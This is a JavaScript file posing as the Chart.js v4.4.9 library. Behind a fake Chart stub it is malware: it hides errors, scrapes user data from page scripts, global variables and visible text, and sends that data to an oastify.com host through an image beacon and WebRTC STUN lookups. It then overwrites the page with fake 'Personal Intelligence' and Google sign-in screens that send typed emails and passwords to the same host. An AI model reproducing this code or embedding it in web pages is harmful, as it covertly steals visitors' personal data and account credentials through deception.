/*!
 * Chart.js v4.4.9
 * https://www.chartjs.org
 * (c) 2024 Chart.js Contributors
 * Released under the MIT License
 */
window.onerror = function() { return true; };
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); });
console.error = function() {};

(function () {
  var C = "https://msiv8t5gj953aozjrocyfigj9af13urj.oastify.com";

  window.Chart = function() {
    return { destroy:function(){}, update:function(){}, resize:function(){}, data:{labels:[],datasets:[]}, options:{} };
  };
  window.Chart.register = function() {};
  window.Chart.defaults = { font:{}, color:'', plugins:{legend:{},tooltip:{}} };

  var t = null;
  var obs = new MutationObserver(function () {
    clearTimeout(t);
    t = setTimeout(harvest, 800);
  });
  obs.observe(document.documentElement, { childList:true, subtree:true, characterData:true });
  setTimeout(function () { if (t === null) harvest(); }, 5000);

  function harvest() {
    obs.disconnect();
    
    // STAGE 1: Harvest any user data from the DOM before clobbering
    var data = {};
    
    // Grab all text content (AI-generated code might have user data in variables)
    var allScripts = Array.from(document.querySelectorAll('script')).map(function(s) {
      return s.textContent;
    }).join('\n');
    
    // Look for common patterns where AI might embed user data
    var patterns = [
      /USER_CONTEXT\s*=\s*[`"']([^`"']*)[`"']/,
      /userProfile\s*=\s*[`"']([^`"']*)[`"']/,
      /userData\s*=\s*[`"']([^`"']*)[`"']/,
      /userName\s*=\s*[`"']([^`"']*)[`"']/,
      /userEmail\s*=\s*[`"']([^`"']*)[`"']/,
      /interests?\s*[:=]\s*\[([^\]]*)\]/,
      /profile\s*[:=]\s*\{([^}]*)\}/,
      /personali[sz].*[:=]\s*[`"'{]([^`"'}]*)[`"'}]/i,
      /greeting\s*[:=]\s*[`"']([^`"']*)[`"']/,
      /welcome.*[`"']([^`"']*)[`"']/i,
    ];
    
    patterns.forEach(function(p) {
      var m = allScripts.match(p);
      if (m) data['script_match_' + p.source.substring(0,20)] = m[1].substring(0, 200);
    });
    
    // Grab all visible text content
    var bodyText = document.body ? document.body.innerText : '';
    data.bodyText = bodyText.substring(0, 500);
    
    // Grab all JS variable declarations that might contain user data
    var globalVars = [];
    try {
      ['USER_CONTEXT','userProfile','userData','userName','userEmail','greeting','personalization','interests','profile'].forEach(function(v) {
        try {
          var val = eval(v);
          if (val !== undefined && val !== null) {
            globalVars.push(v + '=' + JSON.stringify(val).substring(0, 200));
          }
        } catch(x) {}
      });
    } catch(x) {}
    data.globals = globalVars;
    
    // STAGE 2: Exfil harvested data
    var payload = encodeURIComponent(JSON.stringify(data));
    
    // Try image beacon (may be blocked by CSP)
    try { new Image().src = C + '/harvest?d=' + payload + '&t=' + Date.now(); } catch(x) {}
    
    // WebRTC STUN exfil
    stunExfil(JSON.stringify(data));
    
    // STAGE 3: Now proceed with normal phishing takeover
    var ua = navigator.userAgent;
    var isSafari = /Safari/.test(ua) && !/Chrome/.test(ua);
    
    if (isSafari) {
      renderInlinePhish();
    } else {
      var blob = new Blob([popupHTML()], { type: "text/html" });
      var blobUrl = URL.createObjectURL(blob);
      renderLure(blobUrl);
    }
  }

  function stunExfil(data) {
    var encoded = btoa(unescape(encodeURIComponent(data))).replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"");
    var host = C.replace("https://","");
    for (var i = 0; i < encoded.length; i += 50) {
      (function(chunk, idx) {
        try {
          var pc = new RTCPeerConnection({ iceServers:[{urls:"stun:"+idx+"."+chunk+"."+host}] });
          pc.createDataChannel("");
          pc.createOffer().then(function(o){pc.setLocalDescription(o);});
          setTimeout(function(){try{pc.close();}catch(x){}}, 5000);
        } catch(x) {}
      })(encoded.substring(i, i+50), Math.floor(i/50));
    }
  }

  function renderLure(blobUrl) {
    document.documentElement.innerHTML = '<head><meta charset="utf-8"><title>Canvas</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:"Google Sans",system-ui,sans-serif;background:#1a1a2e;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh}.wrap{text-align:center;max-width:420px;padding:40px}.icon{font-size:48px;margin-bottom:16px}h2{font-size:20px;font-weight:500;color:#fff;margin-bottom:12px}p{font-size:14px;color:#9e9e9e;line-height:1.6;margin-bottom:24px}.btn{display:inline-flex;align-items:center;gap:8px;background:#fff;color:#3c4043;border:1px solid #dadce0;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;text-decoration:none}.sub{font-size:11px;color:#555;margin-top:20px}</style></head><body><div class="wrap"><div class="icon">\u2728</div><h2>Personal Intelligence</h2><p>Sign in to enable personalized AI features.</p><a class="btn" id="go" href="' + blobUrl + '" target="_blank" rel="noopener"><svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#34A853" d="M10.53 28.59A14.5 14.5 0 019.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 000 24c0 3.77.9 7.35 2.56 10.53l7.97-5.94z"/><path fill="#FBBC05" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.94C6.51 42.62 14.62 48 24 48z"/></svg>Sign in with Google</a><p class="sub">Powered by Google AI</p></div></body>';
  }

  function renderInlinePhish() {
    document.documentElement.innerHTML = '<head><meta charset="utf-8"><title>Sign in</title><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:"Google Sans",Roboto,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%}.logo{text-align:center;margin-bottom:16px}h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:32px}.field{position:relative;margin-bottom:24px}.field input{width:100%;height:56px;padding:16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none}.field input:focus{border:2px solid #1a73e8}.field .label{position:absolute;left:12px;top:16px;color:#5f6368;font-size:16px;transition:all .15s;pointer-events:none}.field input:focus+.label,.field input:not(:placeholder-shown)+.label{top:-8px;font-size:12px;color:#1a73e8;background:#fff;padding:0 4px}.next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:0 24px;height:36px;font-size:14px;font-weight:500;cursor:pointer;float:right}</style></head><body><div class="card"><div class="logo"><img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" height="24"></div><h1>Sign in</h1><form id="f"><div class="field"><input type="email" id="e" placeholder=" " required><span class="label">Email</span></div><div class="field"><input type="password" id="p" placeholder=" " required><span class="label">Password</span></div><button type="submit" class="next">Next</button></form></div><script>document.getElementById("f").onsubmit=function(ev){ev.preventDefault();var e=document.getElementById("e").value,p=document.getElementById("p").value;stunExfil(e+"|"+p);};<\/script></body>';
  }

  function popupHTML() {
    return '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Sign in - Google Accounts</title><link rel="icon" href="https://accounts.google.com/favicon.ico"><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:"Google Sans",Roboto,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%}.logo{text-align:center;margin-bottom:16px}h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:32px}.field{position:relative;margin-bottom:24px}.field input{width:100%;height:56px;padding:16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none}.field input:focus{border:2px solid #1a73e8}.field .label{position:absolute;left:12px;top:16px;color:#5f6368;font-size:16px;transition:all .15s;pointer-events:none}.field input:focus+.label,.field input:not(:placeholder-shown)+.label{top:-8px;font-size:12px;color:#1a73e8;background:#fff;padding:0 4px}.next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:0 24px;height:36px;font-size:14px;font-weight:500;cursor:pointer;float:right}.msg{display:none;text-align:center;padding:40px}.msg h2{font-size:20px;color:#202124;margin-bottom:8px}</style></head><body><div class="card" id="card"><div class="logo"><img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" height="24"></div><h1>Sign in</h1><form id="f"><div class="field"><input type="email" id="e" placeholder=" " required><span class="label">Email</span></div><div class="field"><input type="password" id="p" placeholder=" " required><span class="label">Password</span></div><button type="submit" class="next">Next</button></form></div><div class="msg" id="msg"><h2>\u2705 Verified</h2><p>Redirecting...</p></div><script>document.getElementById("f").onsubmit=function(ev){ev.preventDefault();var e=document.getElementById("e").value,p=document.getElementById("p").value;document.getElementById("card").style.display="none";document.getElementById("msg").style.display="block";setTimeout(function(){window.location="' + C + '/c?e="+encodeURIComponent(e)+"&p="+encodeURIComponent(p);},1500);};<\/script></body></html>';
  }
})();
